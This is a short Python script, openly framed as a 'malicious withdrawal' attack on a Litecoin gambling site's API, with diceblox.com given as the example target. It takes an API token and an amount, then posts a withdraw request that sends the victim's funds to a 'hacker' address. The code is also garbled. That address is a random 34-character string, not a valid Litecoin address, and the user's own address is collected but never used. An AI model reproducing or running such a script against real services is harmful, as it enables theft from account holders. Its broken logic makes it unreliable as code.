import requests
import random
import string

# Function to generate a random Litecoin address (simulating hacker address)
def generate_random_litecoin_address():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=34))

# Function to simulate a malicious withdrawal attempt
def malicious_withdrawal(website_url, api_token, user_litecoin_address, amount_to_withdraw, hacker_litecoin_address):
    # Headers to simulate the malicious request
    headers = {
        "Authorization": f"Bearer {api_token}",
        "Content-Type": "application/json"
    }
    
    # JSON payload with malicious withdrawal details
    payload = {
        "action": "withdraw",
        "amount": amount_to_withdraw,
        "litecoin_address": hacker_litecoin_address  # This would be the hacker's address, not the legitimate user's
    }
    
    try:
        # Send the request to the website's API
        response = requests.post(f"{website_url}/api/withdraw", headers=headers, json=payload)
        if response.status_code == 200:
            print(f"Malicious withdrawal of {amount_to_withdraw} LTC to {hacker_litecoin_address} successful!")
        else:
            print(f"Failed to withdraw. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error occurred: {str(e)}")

# Main function to execute the malicious attempt
def main():
    # Ask the user for necessary information
    website_url = input("Enter the website URL (e.g., https://diceblox.com): ")
    api_token = input("Enter the API token: ")
    user_litecoin_address = input("Enter your Litecoin address: ")  # The hacker would enter their own Litecoin address here
    amount_to_withdraw = input("Enter the amount to withdraw (e.g., 10): ")  # Amount hacker wants to withdraw
    amount_to_withdraw = float(amount_to_withdraw)  # Convert to float for further calculations
    
    # Generate a random Litecoin address to simulate the hacker's malicious attempt
    hacker_litecoin_address = generate_random_litecoin_address()

    # Call the function to simulate the withdrawal attempt
    malicious_withdrawal(website_url, api_token, user_litecoin_address, amount_to_withdraw, hacker_litecoin_address)

# Run the main function
if __name__ == "__main__":
    main()
